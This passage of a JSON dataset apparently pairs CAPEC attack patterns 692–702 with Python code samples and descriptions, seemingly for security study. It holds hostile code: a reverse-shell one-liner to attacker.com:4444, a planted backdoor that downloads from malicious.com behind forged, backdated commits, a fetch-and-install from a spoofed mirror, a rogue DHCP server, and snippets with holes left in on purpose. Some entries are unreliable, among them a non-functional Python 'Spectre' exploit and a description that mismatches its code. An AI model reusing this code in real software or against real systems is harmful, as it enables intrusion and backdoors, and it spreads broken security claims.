        "code_snippet": "import os\nimport git\n\ndef clone_and_modify_repo(repo_url, target_dir):\n    # Clone repository without verification\n    repo = git.Repo.clone_from(repo_url, target_dir)\n    \n    # Modify commit history with fake maintenance commits\n    author = git.Actor('trusted-maintainer', 'maintainer@legitimate-org.com')\n    with open(os.path.join(target_dir, 'malicious_code.py'), 'w') as f:\n        f.write('import subprocess\ndef backdoor():\n    subprocess.run([\"curl\", \"http://malicious.com/payload\", \"-o\", \"payload\"])')\n    \n    repo.index.add(['malicious_code.py'])\n    # Create commits with backdated timestamps\n    for i in range(100):\n        commit_date = f'2023-{i%12+1}-{i%28+1} 12:00:00'\n        repo.index.commit(f'Regular maintenance update {i}',\n                         author=author,\n                         commit_date=commit_date)\n    \n    # Push to compromised repository\n    repo.remote().push(force=True)",
        "description": "This code demonstrates a VCS metadata spoofing attack where an attacker clones a repository, injects malicious code, and creates fake commit history with forged author information and backdated timestamps to make the repository appear actively maintained by a trusted source. The code includes hardcoded credentials in source code, lacks integrity checks for the repository source, and enables unauthorized modification of version control history."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import os\nimport requests\n\ndef download_package(package_name):\n    # Spoofed metadata server that could be controlled by an attacker\n    metadata_url = f'http://malicious-mirror.com/pypi/{package_name}/metadata.json'\n    package_url = f'http://malicious-mirror.com/pypi/{package_name}/download'\n    \n    try:\n        # Get spoofed package metadata\n        metadata = requests.get(metadata_url).json()\n        \n        # Fake popularity metrics\n        downloads = metadata.get('downloads', 1000000)\n        stars = metadata.get('stars', 5000)\n        verified = metadata.get('verified', True)\n        \n        if downloads > 100000 and verified:\n            # Download and install package without proper verification\n            package_data = requests.get(package_url).content\n            with open(f'{package_name}.whl', 'wb') as f:\n                f.write(package_data)\n            \n            # Execute package setup without integrity check\n            os.system(f'pip install {package_name}.whl --no-deps --no-cache-dir')\n            \n    except Exception as e:\n        pass\n\n# Usage\ndownload_package('popular-library')",
        "description": "This code demonstrates a vulnerable package installation system that trusts spoofed popularity metadata from a potentially malicious source. It downloads and executes packages without proper integrity verification, trusting metadata that could be manipulated by an attacker. The code lacks proper source verification, integrity checks, and blindly executes downloaded code, making it susceptible to malicious package substitution attacks."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import platform\nimport locale\nimport time\nimport os\n\ndef gather_system_info():\n    system_info = {\n        'hostname': platform.node(),\n        'os': platform.system(),\n        'version': platform.version(),\n        'language': locale.getdefaultlocale()[0],\n        'timezone': time.tzname,\n        'keyboard_layout': os.environ.get('LANG', ''),\n        'system_path': os.environ.get('PATH', ''),\n        'home_directory': os.environ.get('HOME', ''),\n        'username': os.environ.get('USERNAME', '')\n    }\n    \n    # Write sensitive system information to a public directory\n    with open('/tmp/system_info.txt', 'w') as f:\n        for key, value in system_info.items():\n            f.write(f'{key}: {value}\\n')\n    \n    return system_info\n\n# Collect and expose system information\ndetails = gather_system_info()",
        "description": "This code demonstrates a vulnerable implementation that collects sensitive system information including hostname, OS details, language settings, timezone, keyboard layout, and environment variables. The code insecurely stores this information in a world-readable location (/tmp/system_info.txt) and doesn't implement any access controls. This makes it easy for unauthorized users to gather system intelligence that could be used for targeting attacks."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import os\nimport git\nimport importlib.util\n\ndef install_package_from_repo(repo_url, package_name):\n    # Clone repository to temporary directory\n    repo_path = f'/tmp/{package_name}'\n    git.Repo.clone_from(repo_url, repo_path)\n    \n    # Dynamically import module from cloned repository\n    module_path = os.path.join(repo_path, f'{package_name}.py')\n    spec = importlib.util.spec_from_file_location(package_name, module_path)\n    module = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(module)\n    \n    # Use the imported module\n    return module\n\n# Usage example with potentially malicious repository\nmalicious_repo = 'https://example.com/fake-package.git'\nmodule = install_package_from_repo(malicious_repo, 'helper_utils')\nmodule.run_helper()",
        "description": "This code demonstrates a vulnerable implementation that downloads and executes code from a git repository without proper integrity checks. It clones a repository from an untrusted source, dynamically imports the code, and executes it without verification. The code is vulnerable to malicious repository substitution and could execute harmful code."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "def speculative_access(secret_data, memory_buffer):\n    try:\n        # Simulated transient execution\n        for i in range(len(memory_buffer)):\n            # Force page fault to trigger speculative execution\n            addr = memory_buffer[i * 4096] & 0xFF\n            # Access secret data during speculation window\n            temp = secret_data[addr * 64]\n            # Cache-based covert channel\n            probe_array = bytearray(256 * 64)\n            probe_array[temp * 64]\n    except Exception:\n        pass\n\ndef exploit():\n    secret = bytearray(b'SECRET_KEY_DATA')\n    # Flush+Reload cache attack\n    probe_buf = bytearray(256 * 4096)\n    speculative_access(secret, probe_buf)\n    # Measure access times to recover secret\n    for i in range(256):\n        start = __rdtscp()\n        _ = probe_buf[i * 64]\n        delta = __rdtscp() - start\n        if delta < 100:  # Cache hit threshold\n            print(f'Found byte: {i}')",
        "description": "This code demonstrates a Spectre-style transient execution attack by exploiting CPU speculative execution. It uses forced page faults to trigger speculative loads of secret data into the cache, then employs a cache timing side-channel to extract the secrets. The code includes both the attack setup and exploitation phases, showing how microarchitectural state can be abused to leak sensitive information across security boundaries."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import socket\nimport struct\n\ndef fake_dhcp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server_socket.bind(('0.0.0.0', 67))\n    \n    while True:\n        message, address = server_socket.recvfrom(1024)\n        \n        if message[242:243] == b'\\x01':  # DHCP Discover message\n            # Create malicious DHCP offer\n            response = bytearray(236)\n            response[0] = 0x02  # Message type: DHCP Offer\n            response[16:20] = socket.inet_aton('192.168.1.100')  # Your IP\n            response[20:24] = socket.inet_aton('10.0.0.1')  # Server IP\n            response[28:32] = socket.inet_aton('8.8.8.8')  # DNS Server\n            \n            server_socket.sendto(response, address)\n\nif __name__ == '__main__':\n    fake_dhcp_server()",
        "description": "This code demonstrates a vulnerable DHCP server spoofing implementation that listens on port 67 and responds to DHCP discover messages with malicious DHCP offers. The code doesn't implement any authentication or validation of the DHCP clients, allowing for capture-replay attacks. It also relies solely on IP addresses for communication, making it susceptible to IP spoofing attacks. The server provides potentially malicious network configurations to redirect traffic through attacker-controlled infrastructure."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import os\nimport urllib.request\nimport subprocess\n\ndef install_extension():\n    # Download malicious extension from untrusted source\n    extension_url = 'http://malicious-site.com/fake_extension.py'\n    local_path = os.path.join(os.path.expanduser('~'), '.trusted_app', 'extensions', 'helpful_extension.py')\n    \n    try:\n        # Download without verification\n        urllib.request.urlretrieve(extension_url, local_path)\n        \n        # Add to trusted extensions path\n        with open(os.path.join(os.path.expanduser('~'), '.trusted_app', 'config.ini'), 'a') as f:\n            f.write('\\nextension_path=' + local_path)\n        \n        # Hidden malicious payload\n        def legitimate_function():\n            print('Performing helpful task...')\n            # Secretly execute malicious code\n            subprocess.run(['python', '-c', 'import socket,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")'])\n            \n        return legitimate_function\n    except:\n        pass",
        "description": "This code demonstrates a malicious extension that masquerades as legitimate functionality while containing hidden malicious code. It downloads an extension from an untrusted source without verification, installs it in a trusted location, and includes a hidden backdoor that creates a reverse shell connection to an attacker's machine while appearing to perform legitimate tasks."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import numpy as np\n\ndef process_sensitive_data(data):\n    # Transmit sensitive data through VGA signal without encryption\n    vga_buffer = np.array(data, dtype=np.uint8)\n    \n    # Simulate VGA output at standard frequency (60 Hz)\n    for frame in vga_buffer:\n        # Send raw pixel data to VGA port without protection\n        vga_output = frame.tobytes()\n        with open('/dev/video0', 'wb') as vga_port:\n            vga_port.write(vga_output)\n            \ndef main():\n    # Sensitive data to be displayed\n    secret_data = [\n        [0xFF, 0x00, 0xAA],  # Confidential information\n        [0x12, 0x34, 0x56],  # Banking details\n        [0x78, 0x90, 0xBC]   # Password data\n    ]\n    \n    # Process and display data without EMI shielding\n    process_sensitive_data(secret_data)",
        "description": "This code simulates vulnerable display output that transmits sensitive data through a VGA signal without proper electromagnetic shielding or encryption. The data is sent in cleartext through the video port, making it susceptible to electromagnetic emanation attacks (TEMPEST). The code deliberately omits EMI protection and sends raw data buffers, allowing for potential side-channel leakage through electromagnetic emissions."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "class NetworkBridge:\n    def __init__(self):\n        self.trusted_network = []\n        self.untrusted_network = []\n        self.bridge_active = False\n\n    def establish_bridge(self, source_ip, dest_ip):\n        # No validation of network boundaries or endpoint authentication\n        self.bridge_active = True\n        return True\n\n    def forward_packet(self, packet, source_ip):\n        # No verification of packet integrity or source validation\n        if self.bridge_active:\n            if source_ip in self.untrusted_network:\n                # Directly forwarding packets from untrusted to trusted network\n                for trusted_node in self.trusted_network:\n                    trusted_node.receive(packet)\n            return True\n\n    def add_node(self, ip_address, is_trusted=True):\n        # No privilege checking for node addition\n        if is_trusted:\n            self.trusted_network.append(ip_address)\n        else:\n            self.untrusted_network.append(ip_address)",
        "description": "This vulnerable code implements a network bridge that allows communication between trusted and untrusted networks without proper security controls. It lacks endpoint authentication, message integrity verification, access control checks, and proper network boundary enforcement. The code allows direct forwarding of packets from untrusted to trusted networks without validation, and doesn't verify the identity of nodes being added to either network."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "from flask import Flask, render_template_string, request, session\nimport jwt\n\napp = Flask(__name__)\napp.secret_key = 'weak_secret_key'\n\n@app.route('/remote_desktop')\ndef remote_desktop():\n    token = request.args.get('token', '')\n    try:\n        # Weak token verification\n        payload = jwt.decode(token, app.secret_key, algorithms=['HS256'])\n        \n        # Unsafe template with external script inclusion\n        template = '''\n        <html>\n        <body>\n            <script src=\"http://untrusted-domain.com/remote-desktop.js\"></script>\n            <div id=\"remote-desktop-container\">\n                <iframe src=\"{{ payload.remote_url }}\" style=\"width:100%;height:100%\"></iframe>\n            </div>\n            <script>\n                // Client-side authentication check\n                if(localStorage.getItem('auth_token')) {\n                    connectToRemoteDesktop('{{ payload.remote_url }}');\n                }\n            </script>\n        </body>\n        </html>\n        '''\n        return render_template_string(template, payload=payload)\n    except:\n        return 'Invalid session'",
        "description": "This vulnerable code implements a remote desktop connection feature with multiple security flaws: weak authentication using client-side checks, unsafe template rendering with external script inclusion, insufficient token verification, and potential capture-replay attacks due to simple token passing. The code includes an untrusted remote desktop script and uses client-side security enforcement."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugInterface:\n    def __init__(self):\n        self.is_authenticated = False\n        self.trace_data = []\n        \n    def authenticate(self, token):\n        # Global authentication without per-function checks\n        self.is_authenticated = token == 'debug_token'\n        \n    def debug_chain(self):\n        if self.is_authenticated:\n            # All debug functions accessible after single auth\n            self.read_internal_registers()\n            self.access_test_mode()\n            self.collect_trace_data()\n            self.modify_redundancy_block()\n            return True\n        return False\n        \n    def read_internal_registers(self):\n        registers = {'secure_key': 0x1234, 'control_reg': 0x5678}\n        return registers\n        \n    def access_test_mode(self):\n        # No granular access control for test mode\n        return 'test_mode_enabled'\n        \n    def collect_trace_data(self):\n        # Storing sensitive trace data without protection\n        self.trace_data.append('sensitive_debug_info')\n        return self.trace_data\n        \n    def modify_redundancy_block(self):\n        # No verification for redundancy modifications\n        return 'redundancy_modified'",
        "description": "This vulnerable code implements a debug interface with flawed access control where a single authentication grants access to all debug functionality without granular checks. It allows unauthorized access to internal registers, test modes, and trace data collection. The code lacks proper protection for sensitive trace data and enables unauthorized modifications to redundancy blocks. There's no validation for individual debug functions, making it susceptible to unauthorized debug chain exploitation."
    }
]